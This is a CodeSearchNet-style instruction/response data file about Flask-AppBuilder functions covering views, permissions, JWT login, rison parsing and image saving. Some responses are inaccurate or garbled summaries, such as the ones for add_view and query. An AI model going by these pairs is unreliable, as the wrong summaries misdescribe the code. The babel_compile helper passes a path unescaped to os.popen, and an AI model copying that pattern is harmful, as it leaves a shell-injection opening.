{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef babel_compile(target):\n    click.echo(click.style(\"Starting Compile target:{0}\".format(target), fg=\"green\"))\n    os.popen(\"pybabel compile -f -d {0}\".format(target))", "response": "Babel, Compiles all translations"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef dynamic_class_import(class_path):\n    # Split first occurrence of path\n    try:\n        tmp = class_path.split(\".\")\n        module_path = \".\".join(tmp[0:-1])\n        package = __import__(module_path)\n        return reduce(getattr, tmp[1:], package)\n    except Exception as e:\n        log.exception(e)\n        log.error(LOGMSG_ERR_FAB_ADDON_IMPORT.format(class_path, e))", "response": "Will dynamically import a class from a string with class path\n       "}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninitialize the Flask application.", "response": "def init_app(self, app, session):\n        \"\"\"\n            Will initialize the Flask app, supporting the app factory pattern.\n\n            :param app:\n            :param session: The SQLAlchemy session\n\n        \"\"\"\n        app.config.setdefault(\"APP_NAME\", \"F.A.B.\")\n        app.config.setdefault(\"APP_THEME\", \"\")\n        app.config.setdefault(\"APP_ICON\", \"\")\n        app.config.setdefault(\"LANGUAGES\", {\"en\": {\"flag\": \"gb\", \"name\": \"English\"}})\n        app.config.setdefault(\"ADDON_MANAGERS\", [])\n        app.config.setdefault(\"FAB_API_MAX_PAGE_SIZE\", 20)\n        self.app = app\n        if self.update_perms:  # default is True, if False takes precedence from config\n            self.update_perms = app.config.get('FAB_UPDATE_PERMS', True)\n        _security_manager_class_name = app.config.get('FAB_SECURITY_MANAGER_CLASS', None)\n        if _security_manager_class_name is not None:\n            self.security_manager_class = dynamic_class_import(\n                _security_manager_class_name\n            )\n        if self.security_manager_class is None:\n            from flask_appbuilder.security.sqla.manager import SecurityManager\n            self.security_manager_class = SecurityManager\n\n        self._addon_managers = app.config[\"ADDON_MANAGERS\"]\n        self.session = session\n        self.sm = self.security_manager_class(self)\n        self.bm = BabelManager(self)\n        self.openapi_manager = OpenApiManager(self)\n        self._add_global_static()\n        self._add_global_filters()\n        app.before_request(self.sm.before_request)\n        self._add_admin_views()\n        self._add_addon_views()\n        if self.app:\n            self._add_menu_permissions()\n        else:\n            self.post_init()\n        self._init_extension(app)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nregister indexview, utilview (back function), babel views and Security views.", "response": "def _add_admin_views(self):\n        \"\"\"\n            Registers indexview, utilview (back function), babel views and Security views.\n        \"\"\"\n        self.indexview = self._check_and_init(self.indexview)\n        self.add_view_no_menu(self.indexview)\n        self.add_view_no_menu(UtilView())\n        self.bm.register_views()\n        if self.get_app.config.get('FAB_ADD_SECURITY_VIEWS', True):\n            self.sm.register_views()\n        if self.get_app.config.get('FAB_ADD_OPENAPI_VIEWS', True):\n            self.openapi_manager.register_views()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd the views to the addon manager list", "response": "def _add_addon_views(self):\n        \"\"\"\n            Registers declared addon's\n        \"\"\"\n        for addon in self._addon_managers:\n            addon_class = dynamic_class_import(addon)\n            if addon_class:\n                # Instantiate manager with appbuilder (self)\n                addon_class = addon_class(self)\n                try:\n                    addon_class.pre_process()\n                    addon_class.register_views()\n                    addon_class.post_process()\n                    self.addon_managers[addon] = addon_class\n                    log.info(LOGMSG_INF_FAB_ADDON_ADDED.format(str(addon)))\n                except Exception as e:\n                    log.exception(e)\n                    log.error(LOGMSG_ERR_FAB_ADDON_PROCESS.format(addon, e))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_view(\n        self,\n        baseview,\n        name,\n        href=\"\",\n        icon=\"\",\n        label=\"\",\n        category=\"\",\n        category_icon=\"\",\n        category_label=\"\",\n    ):\n        \"\"\"\n        Add your views associated with menus using this method.\n\n        :param baseview:\n            A BaseView type class instantiated or not.\n            This method will instantiate the class for you if needed.\n        :param name:\n            The string name that identifies the menu.\n        :param href:\n            Override the generated href for the menu.\n            You can use an url string or an endpoint name\n            if non provided default_view from view will be set as href.\n        :param icon:\n            Font-Awesome icon name, optional.\n        :param label:\n            The label that will be displayed on the menu,\n            if absent param name will be used\n        :param category:\n            The menu category where the menu will be included,\n            if non provided the view will be acessible as a top menu.\n        :param category_icon:\n            Font-Awesome icon name for the category, optional.\n        :param category_label:\n            The label that will be displayed on the menu,\n            if absent param name will be used\n\n        Examples::\n\n            appbuilder = AppBuilder(app, db)\n            # Register a view, rendering a top menu without icon.\n            appbuilder.add_view(MyModelView(), \"My View\")\n            # or not instantiated\n            appbuilder.add_view(MyModelView, \"My View\")\n            # Register a view, a submenu \"Other View\" from \"Other\" with a phone icon.\n            appbuilder.add_view(\n                MyOtherModelView,\n                \"Other View\",\n                icon='fa-phone',\n                category=\"Others\"\n            )\n            # Register a view, with category icon and translation.\n            appbuilder.add_view(\n                YetOtherModelView,\n                \"Other View\",\n                icon='fa-phone',\n                label=_('Other View'),\n                category=\"Others\",\n                category_icon='fa-envelop',\n                category_label=_('Other View')\n            )\n            # Add a link\n            appbuilder.add_link(\"google\", href=\"www.google.com\", icon = \"fa-google-plus\")\n        \"\"\"\n        baseview = self._check_and_init(baseview)\n        log.info(LOGMSG_INF_FAB_ADD_VIEW.format(baseview.__class__.__name__, name))\n\n        if not self._view_exists(baseview):\n            baseview.appbuilder = self\n            self.baseviews.append(baseview)\n            self._process_inner_views()\n            if self.app:\n                self.register_blueprint(baseview)\n                self._add_permission(baseview)\n        self.add_link(\n            name=name,\n            href=href,\n            icon=icon,\n            label=label,\n            category=category,\n            category_icon=category_icon,\n            category_label=category_label,\n            baseview=baseview,\n        )\n        return baseview", "response": "This method adds views to the baseview of the specified baseview."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_link(\n        self,\n        name,\n        href,\n        icon=\"\",\n        label=\"\",\n        category=\"\",\n        category_icon=\"\",\n        category_label=\"\",\n        baseview=None,\n    ):\n        \"\"\"\n            Add your own links to menu using this method\n\n            :param name:\n                The string name that identifies the menu.\n            :param href:\n                Override the generated href for the menu.\n                You can use an url string or an endpoint name\n            :param icon:\n                Font-Awesome icon name, optional.\n            :param label:\n                The label that will be displayed on the menu,\n                if absent param name will be used\n            :param category:\n                The menu category where the menu will be included,\n                if non provided the view will be accessible as a top menu.\n            :param category_icon:\n                Font-Awesome icon name for the category, optional.\n            :param category_label:\n                The label that will be displayed on the menu,\n                if absent param name will be used\n\n        \"\"\"\n        self.menu.add_link(\n            name=name,\n            href=href,\n            icon=icon,\n            label=label,\n            category=category,\n            category_icon=category_icon,\n            category_label=category_label,\n            baseview=baseview,\n        )\n        if self.app:\n            self._add_permissions_menu(name)\n            if category:\n                self._add_permissions_menu(category)", "response": "Add a link to the menu."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_view_no_menu(self, baseview, endpoint=None, static_folder=None):\n        baseview = self._check_and_init(baseview)\n        log.info(LOGMSG_INF_FAB_ADD_VIEW.format(baseview.__class__.__name__, \"\"))\n\n        if not self._view_exists(baseview):\n            baseview.appbuilder = self\n            self.baseviews.append(baseview)\n            self._process_inner_views()\n            if self.app:\n                self.register_blueprint(\n                    baseview, endpoint=endpoint, static_folder=static_folder\n                )\n                self._add_permission(baseview)\n        else:\n            log.warning(LOGMSG_WAR_FAB_VIEW_EXISTS.format(baseview.__class__.__name__))\n        return baseview", "response": "Add your views without creating a menu."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nlogging-in endpoint for the API returns a JWT and optionally a refresh token --- post: requestBody: required: true content: application/json: schema: type: object properties: username: type: string password: type: string provider: type: string enum: - db - ldap refresh: type: boolean responses: 200: description: Authentication Successful content: application/json: schema: type: object properties: access_token: type: string refresh_token: type: string 400: $ref: '#/components/responses/400' 401: $ref: '#/components/responses/401' 500: $ref: '#/components/responses/500'", "response": "def login(self):\n        \"\"\"Login endpoint for the API returns a JWT and optionally a refresh token\n        ---\n        post:\n          requestBody:\n            required: true\n            content:\n              application/json:\n                schema:\n                  type: object\n                  properties:\n                    username:\n                      type: string\n                    password:\n                      type: string\n                    provider:\n                      type: string\n                      enum:\n                      - db\n                      - ldap\n                    refresh:\n                      type: boolean\n          responses:\n            200:\n              description: Authentication Successful\n              content:\n                application/json:\n                  schema:\n                    type: object\n                    properties:\n                      access_token:\n                        type: string\n                      refresh_token:\n                        type: string\n            400:\n              $ref: '#/components/responses/400'\n            401:\n              $ref: '#/components/responses/401'\n            500:\n              $ref: '#/components/responses/500'\n        \"\"\"\n        if not request.is_json:\n            return self.response_400(message=\"Request payload is not JSON\")\n        username = request.json.get(API_SECURITY_USERNAME_KEY, None)\n        password = request.json.get(API_SECURITY_PASSWORD_KEY, None)\n        provider = request.json.get(API_SECURITY_PROVIDER_KEY, None)\n        refresh = request.json.get(API_SECURITY_REFRESH_KEY, False)\n        if not username or not password or not provider:\n            return self.response_400(message=\"Missing required parameter\")\n        # AUTH\n        if provider == API_SECURITY_PROVIDER_DB:\n            user = self.appbuilder.sm.auth_user_db(username, password)\n        elif provider == API_SECURITY_PROVIDER_LDAP:\n            user = self.appbuilder.sm.auth_user_ldap(username, password)\n        else:\n            return self.response_400(\n                message=\"Provider {} not supported\".format(provider)\n            )\n        if not user:\n            return self.response_401()\n\n        # Identity can be any data that is json serializable\n        resp = dict()\n        resp[API_SECURITY_ACCESS_TOKEN_KEY] = create_access_token(\n            identity=user.id, fresh=True\n        )\n        if refresh:\n            resp[API_SECURITY_REFRESH_TOKEN_KEY] = create_refresh_token(\n                identity=user.id\n            )\n        return self.response(200, **resp)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nadd a new user to the database.", "response": "def add_register_user(\n        self, username, first_name, last_name, email, password=\"\", hashed_password=\"\"\n    ):\n        \"\"\"\n            Add a registration request for the user.\n\n            :rtype : RegisterUser\n        \"\"\"\n        register_user = self.registeruser_model()\n        register_user.username = username\n        register_user.email = email\n        register_user.first_name = first_name\n        register_user.last_name = last_name\n        if hashed_password:\n            register_user.password = hashed_password\n        else:\n            register_user.password = generate_password_hash(password)\n        register_user.registration_hash = str(uuid.uuid1())\n        try:\n            self.get_session.add(register_user)\n            self.get_session.commit()\n            return register_user\n        except Exception as e:\n            log.error(c.LOGMSG_ERR_SEC_ADD_REGISTER_USER.format(str(e)))\n            self.appbuilder.get_session.rollback()\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndelete the given register user from the database.", "response": "def del_register_user(self, register_user):\n        \"\"\"\n            Deletes registration object from database\n\n            :param register_user: RegisterUser object to delete\n        \"\"\"\n        try:\n            self.get_session.delete(register_user)\n            self.get_session.commit()\n            return True\n        except Exception as e:\n            log.error(c.LOGMSG_ERR_SEC_DEL_REGISTER_USER.format(str(e)))\n            self.get_session.rollback()\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef find_user(self, username=None, email=None):\n        if username:\n            return (\n                self.get_session.query(self.user_model)\n                .filter(func.lower(self.user_model.username) == func.lower(username))\n                .first()\n            )\n        elif email:\n            return (\n                self.get_session.query(self.user_model).filter_by(email=email).first()\n            )", "response": "Finds user by username or email"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfinding and returns a Permission by name", "response": "def find_permission(self, name):\n        \"\"\"\n            Finds and returns a Permission by name\n        \"\"\"\n        return (\n            self.get_session.query(self.permission_model).filter_by(name=name).first()\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nadds a permission to the backend model permission", "response": "def add_permission(self, name):\n        \"\"\"\n            Adds a permission to the backend, model permission\n\n            :param name:\n                name of the permission: 'can_add','can_edit' etc...\n        \"\"\"\n        perm = self.find_permission(name)\n        if perm is None:\n            try:\n                perm = self.permission_model()\n                perm.name = name\n                self.get_session.add(perm)\n                self.get_session.commit()\n                return perm\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_ADD_PERMISSION.format(str(e)))\n                self.get_session.rollback()\n        return perm"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndeleting a permission from the backend", "response": "def del_permission(self, name):\n        \"\"\"\n            Deletes a permission from the backend, model permission\n\n            :param name:\n                name of the permission: 'can_add','can_edit' etc...\n        \"\"\"\n        perm = self.find_permission(name)\n        if perm:\n            try:\n                self.get_session.delete(perm)\n                self.get_session.commit()\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_DEL_PERMISSION.format(str(e)))\n                self.get_session.rollback()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find_view_menu(self, name):\n        return self.get_session.query(self.viewmenu_model).filter_by(name=name).first()", "response": "Finds and returns a ViewMenu by name"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nadd a view or menu to the backend model view_menu returns the newly added view or menu object", "response": "def add_view_menu(self, name):\n        \"\"\"\n            Adds a view or menu to the backend, model view_menu\n            param name:\n                name of the view menu to add\n        \"\"\"\n        view_menu = self.find_view_menu(name)\n        if view_menu is None:\n            try:\n                view_menu = self.viewmenu_model()\n                view_menu.name = name\n                self.get_session.add(view_menu)\n                self.get_session.commit()\n                return view_menu\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_ADD_VIEWMENU.format(str(e)))\n                self.get_session.rollback()\n        return view_menu"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_permission_view_menu(self, permission_name, view_menu_name):\n        permission = self.find_permission(permission_name)\n        view_menu = self.find_view_menu(view_menu_name)\n        if permission and view_menu:\n            return (\n                self.get_session.query(self.permissionview_model)\n                .filter_by(permission=permission, view_menu=view_menu)\n                .first()\n            )", "response": "Finds and returns a PermissionView by names"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nfinding all permissions from ViewMenu", "response": "def find_permissions_view_menu(self, view_menu):\n        \"\"\"\n            Finds all permissions from ViewMenu, returns list of PermissionView\n\n            :param view_menu: ViewMenu object\n            :return: list of PermissionView objects\n        \"\"\"\n        return (\n            self.get_session.query(self.permissionview_model)\n            .filter_by(view_menu_id=view_menu.id)\n            .all()\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds a permission on a view or menu.", "response": "def add_permission_view_menu(self, permission_name, view_menu_name):\n        \"\"\"\n            Adds a permission on a view or menu to the backend\n\n            :param permission_name:\n                name of the permission to add: 'can_add','can_edit' etc...\n            :param view_menu_name:\n                name of the view menu to add\n        \"\"\"\n        if not (permission_name and view_menu_name):\n            return None\n        pv = self.find_permission_view_menu(\n            permission_name,\n            view_menu_name\n        )\n        if pv:\n            return pv\n        vm = self.add_view_menu(view_menu_name)\n        perm = self.add_permission(permission_name)\n        pv = self.permissionview_model()\n        pv.view_menu_id, pv.permission_id = vm.id, perm.id\n        try:\n            self.get_session.add(pv)\n            self.get_session.commit()\n            log.info(c.LOGMSG_INF_SEC_ADD_PERMVIEW.format(str(pv)))\n            return pv\n        except Exception as e:\n            log.error(c.LOGMSG_ERR_SEC_ADD_PERMVIEW.format(str(e)))\n            self.get_session.rollback()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef add_permission_role(self, role, perm_view):\n        if perm_view not in role.permissions:\n            try:\n                role.permissions.append(perm_view)\n                self.get_session.merge(role)\n                self.get_session.commit()\n                log.info(\n                    c.LOGMSG_INF_SEC_ADD_PERMROLE.format(str(perm_view), role.name)\n                )\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_ADD_PERMROLE.format(str(e)))\n                self.get_session.rollback()", "response": "Adds permission - ViewMenu object to the role object"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nremoves permission - ViewMenu object to the role.", "response": "def del_permission_role(self, role, perm_view):\n        \"\"\"\n            Remove permission-ViewMenu object to Role\n\n            :param role:\n                The role object\n            :param perm_view:\n                The PermissionViewMenu object\n        \"\"\"\n        if perm_view in role.permissions:\n            try:\n                role.permissions.remove(perm_view)\n                self.get_session.merge(role)\n                self.get_session.commit()\n                log.info(\n                    c.LOGMSG_INF_SEC_DEL_PERMROLE.format(str(perm_view), role.name)\n                )\n            except Exception as e:\n                log.error(c.LOGMSG_ERR_SEC_DEL_PERMROLE.format(str(e)))\n                self.get_session.rollback()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list of all tables relevant for a bind.", "response": "def get_tables_for_bind(self, bind=None):\n        \"\"\"Returns a list of all tables relevant for a bind.\"\"\"\n        result = []\n        tables = Model.metadata.tables\n        for key in tables:\n            if tables[key].info.get(\"bind_key\") == bind:\n                result.append(tables[key])\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_api_urls(self, api_urls=None):\n        view_name = self.__class__.__name__\n        api_urls = api_urls or {}\n        api_urls[\"read\"] = url_for(view_name + \".api_read\")\n        api_urls[\"delete\"] = url_for(view_name + \".api_delete\", pk=\"\")\n        api_urls[\"create\"] = url_for(view_name + \".api_create\")\n        api_urls[\"update\"] = url_for(view_name + \".api_update\", pk=\"\")\n        return api_urls", "response": "Returns a dict with the urls of the base API."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef show_item_dict(self, item):\n        d = {}\n        for col in self.show_columns:\n            v = getattr(item, col)\n            if not isinstance(v, (int, float, string_types)):\n                v = str(v)\n            d[col] = v\n        return d", "response": "Returns a json - able dict for show"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef api_column_add(self, col_name):\n        log.warning(\"This API is deprecated and will be removed on 1.15.X\")\n        filter_rel_fields = None\n        if self.add_form_query_rel_fields:\n            filter_rel_fields = self.add_form_query_rel_fields.get(col_name)\n        ret_json = self._get_related_column_data(col_name, filter_rel_fields)\n        response = make_response(ret_json, 200)\n        response.headers[\"Content-Type\"] = \"application/json\"\n        return response", "response": "This function returns the related column data for the given related column name."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn list of (pk, object) nice to use on select2. Use only for related columns. Always filters with edit_form_query_rel_fields, and accepts extra filters on endpoint arguments. :param col_name: The related column name :return: JSON response", "response": "def api_column_edit(self, col_name):\n        \"\"\"\n            Returns list of (pk, object) nice to use on select2.\n            Use only for related columns.\n            Always filters with edit_form_query_rel_fields, and accepts extra filters\n            on endpoint arguments.\n        :param col_name: The related column name\n        :return: JSON response\n        \"\"\"\n        log.warning(\"This API is deprecated and will be removed on 1.15.X\")\n        filter_rel_fields = None\n        if self.edit_form_query_rel_fields:\n            filter_rel_fields = self.edit_form_query_rel_fields\n        ret_json = self._get_related_column_data(col_name, filter_rel_fields)\n        response = make_response(ret_json, 200)\n        response.headers[\"Content-Type\"] = \"application/json\"\n        return response"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nactions method to handle actions from a show view", "response": "def action(self, name, pk):\n        \"\"\"\n            Action method to handle actions from a show view\n        \"\"\"\n        pk = self._deserialize_pk_if_composite(pk)\n        if self.appbuilder.sm.has_access(name, self.__class__.__name__):\n            action = self.actions.get(name)\n            return action.func(self.datamodel.get(pk))\n        else:\n            flash(as_unicode(FLAMSG_ERR_SEC_ACCESS_DENIED), \"danger\")\n            return redirect(\".\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\naction method to handle multiple records selected from a list view", "response": "def action_post(self):\n        \"\"\"\n            Action method to handle multiple records selected from a list view\n        \"\"\"\n        name = request.form[\"action\"]\n        pks = request.form.getlist(\"rowid\")\n        if self.appbuilder.sm.has_access(name, self.__class__.__name__):\n            action = self.actions.get(name)\n            items = [\n                self.datamodel.get(self._deserialize_pk_if_composite(pk)) for pk in pks\n            ]\n            return action.func(items)\n        else:\n            flash(as_unicode(FLAMSG_ERR_SEC_ACCESS_DENIED), \"danger\")\n            return redirect(\".\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nallowing attaching stateless information to the class using the flask session", "response": "def set_key(cls, k, v):\n        \"\"\"Allows attaching stateless information to the class using the\n        flask session dict\n        \"\"\"\n        k = cls.__name__ + \"__\" + k\n        session[k] = v"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the key from the session", "response": "def get_key(cls, k, default=None):\n        \"\"\"Matching get method for ``set_key``\n        \"\"\"\n        k = cls.__name__ + \"__\" + k\n        if k in session:\n            return session[k]\n        else:\n            return default"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef del_key(cls, k):\n        k = cls.__name__ + \"__\" + k\n        session.pop(k)", "response": "Delete the key k from the session."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting joined base filter and current active filter for query", "response": "def _get_list_widget(self, **args):\n        \"\"\" get joined base filter and current active filter for query \"\"\"\n        widgets = super(CompactCRUDMixin, self)._get_list_widget(**args)\n        session_form_widget = self.get_key(\"session_form_widget\", None)\n\n        form_widget = None\n        if session_form_widget == \"add\":\n            form_widget = self._add().get(\"add\")\n        elif session_form_widget == \"edit\":\n            pk = self.get_key(\"session_form_edit_pk\")\n            if pk and self.datamodel.get(int(pk)):\n                form_widget = self._edit(int(pk)).get(\"edit\")\n        return {\n            \"list\": GroupFormListWidget(\n                list_widget=widgets.get(\"list\"),\n                form_widget=form_widget,\n                form_action=self.get_key(\"session_form_action\", \"\"),\n                form_title=self.get_key(\"session_form_title\", \"\"),\n            )\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nadding select load options to query. The goal is to only SQL select what is requested .", "response": "def _query_select_options(self, query, select_columns=None):\n        \"\"\"\n            Add select load options to query. The goal\n            is to only SQL select what is requested\n\n        :param query: SQLAlchemy Query obj\n        :param select_columns: (list) of columns\n        :return: SQLAlchemy Query obj\n        \"\"\"\n        if select_columns:\n            _load_options = list()\n            for column in select_columns:\n                if \".\" in column:\n                    model_relation = self.get_related_model(column.split(\".\")[0])\n                    if not self.is_model_already_joinded(query, model_relation):\n                        query = query.join(model_relation)\n                    _load_options.append(\n                        Load(model_relation).load_only(column.split(\".\")[1])\n                    )\n                else:\n                    if not self.is_relation(column) and not hasattr(\n                        getattr(self.obj, column), \"__call__\"\n                    ):\n                        _load_options.append(Load(self.obj).load_only(column))\n                    else:\n                        _load_options.append(Load(self.obj))\n            query = query.options(*tuple(_load_options))\n        return query"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef query(\n        self,\n        filters=None,\n        order_column=\"\",\n        order_direction=\"\",\n        page=None,\n        page_size=None,\n        select_columns=None,\n    ):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        query = self._query_select_options(query, select_columns)\n        if len(order_column.split('.')) >= 2:\n            for join_relation in order_column.split('.')[:-1]:\n                relation_tuple = self.get_related_model_and_join(join_relation)\n                model_relation, relation_join = relation_tuple\n                if not self.is_model_already_joinded(query, model_relation):\n                    query = query.join(model_relation, relation_join, isouter=True)\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count, filters=filters)\n        query = self._get_base_query(\n            query=query,\n            filters=filters,\n            order_column=order_column,\n            order_direction=order_direction,\n        )\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n        return count, query.all()", "response": "QUERY A base query for the related objects of the current language."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list of all model s columns except pk or fk", "response": "def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef save_file(self, data, filename, size=None, thumbnail_size=None):\n        max_size = size or self.max_size\n        thumbnail_size = thumbnail_size or self.thumbnail_size\n        if data and isinstance(data, FileStorage):\n            try:\n                self.image = Image.open(data)\n            except Exception as e:\n                raise ValidationError(\"Invalid image: %s\" % e)\n\n        path = self.get_path(filename)\n        # If Path does not exist, create it\n        if not op.exists(op.dirname(path)):\n            os.makedirs(os.path.dirname(path), self.permission)\n\n        # Figure out format\n        filename, format = self.get_save_format(filename, self.image)\n        if self.image and (self.image.format != format or max_size):\n            if max_size:\n                image = self.resize(self.image, max_size)\n            else:\n                image = self.image\n            self.save_image(image, self.get_path(filename), format)\n        else:\n            data.seek(0)\n            data.save(path)\n        self.save_thumbnail(data, filename, format, thumbnail_size)\n\n        return filename", "response": "Save an image file"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nuse this decorator to parse URI *Rison* arguments to a python data structure, your method gets the data structure on kwargs['rison']. Response is HTTP 400 if *Rison* is not correct:: class ExampleApi(BaseApi): @expose('/risonjson') @rison() def rison_json(self, **kwargs): return self.response(200, result=kwargs['rison']) You can additionally pass a JSON schema to validate Rison arguments:: schema = { \"type\": \"object\", \"properties\": { \"arg1\": { \"type\": \"integer\" } } } class ExampleApi(BaseApi): @expose('/risonjson') @rison(schema) def rison_json(self, **kwargs): return self.response(200, result=kwargs['rison'])", "response": "def rison(schema=None):\n    \"\"\"\n        Use this decorator to parse URI *Rison* arguments to\n        a python data structure, your method gets the data\n        structure on kwargs['rison']. Response is HTTP 400\n        if *Rison* is not correct::\n\n            class ExampleApi(BaseApi):\n                    @expose('/risonjson')\n                    @rison()\n                    def rison_json(self, **kwargs):\n                        return self.response(200, result=kwargs['rison'])\n\n        You can additionally pass a JSON schema to\n        validate Rison arguments::\n\n            schema = {\n                \"type\": \"object\",\n                \"properties\": {\n                    \"arg1\": {\n                        \"type\": \"integer\"\n                    }\n                }\n            }\n\n            class ExampleApi(BaseApi):\n                    @expose('/risonjson')\n                    @rison(schema)\n                    def rison_json(self, **kwargs):\n                        return self.response(200, result=kwargs['rison'])\n\n    \"\"\"\n\n    def _rison(f):\n        def wraps(self, *args, **kwargs):\n            value = request.args.get(API_URI_RIS_KEY, None)\n            kwargs[\"rison\"] = dict()\n            if value:\n                try:\n                    kwargs[\"rison\"] = prison.loads(value)\n                except prison.decoder.ParserException:\n                    return self.response_400(message=\"Not a valid rison argument\")\n            if schema:\n                try:\n                    jsonschema.validate(instance=kwargs[\"rison\"], schema=schema)\n                except jsonschema.ValidationError as e:\n                    return self.response_400(\n                        message=\"Not a valid rison schema {}\".format(e)\n                    )\n            return f(self, *args, **kwargs)\n\n        return functools.update_wrapper(wraps, f)\n\n    return _rison"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nuses this decorator to expose API endpoints on your API classes. :param url: Relative URL for the endpoint :param methods: Allowed HTTP methods. By default only GET is allowed.", "response": "def expose(url=\"/\", methods=(\"GET\",)):\n    \"\"\"\n        Use this decorator to expose API endpoints on your API classes.\n\n        :param url:\n            Relative URL for the endpoint\n        :param methods:\n            Allowed HTTP methods. By default only GET is allowed.\n    \"\"\"\n\n    def wrap(f):\n        if not hasattr(f, \"_urls\"):\n            f._urls = []\n        f._urls.append((url, methods))\n        return f\n\n    return wrap"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nuse this decorator to set a new merging response function to HTTP endpoints candidate function must have the following signature and be childs of BaseApi: ``` def merge_some_function(self, response, rison_args): ``` :param func: Name of the merge function where the key is allowed :param key: The key name for rison selection :return: None", "response": "def merge_response_func(func, key):\n    \"\"\"\n        Use this decorator to set a new merging\n        response function to HTTP endpoints\n\n        candidate function must have the following signature\n        and be childs of BaseApi:\n        ```\n            def merge_some_function(self, response, rison_args):\n        ```\n\n    :param func: Name of the merge function where the key is allowed\n    :param key: The key name for rison selection\n    :return: None\n    \"\"\"\n\n    def wrap(f):\n        if not hasattr(f, \"_response_key_func_mappings\"):\n            f._response_key_func_mappings = dict()\n        f._response_key_func_mappings[key] = func\n        return f\n\n    return wrap"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nworks like a apispec plugin May return a path as string and mutate operations dict. :param str path: Path to the resource :param dict operations: A `dict` mapping HTTP methods to operation object. See https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.2.md#operationObject :param kwargs: :return: Return value should be a string or None. If a string is returned, it is set as the path.", "response": "def path_helper(self, path=None, operations=None, **kwargs):\n        \"\"\"\n            Works like a apispec plugin\n            May return a path as string and mutate operations dict.\n\n        :param str path: Path to the resource\n        :param dict operations: A `dict` mapping HTTP methods to operation object. See\n            https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.2.md#operationObject\n        :param kwargs:\n        :return: Return value should be a string or None. If a string is returned, it\n        is set as the path.\n        \"\"\"\n        RE_URL = re.compile(r\"<(?:[^:<>]+:)?([^<>]+)>\")\n        path = RE_URL.sub(r\"{\\1}\", path)\n        return \"/{}{}\".format(self.resource_name, path)"}
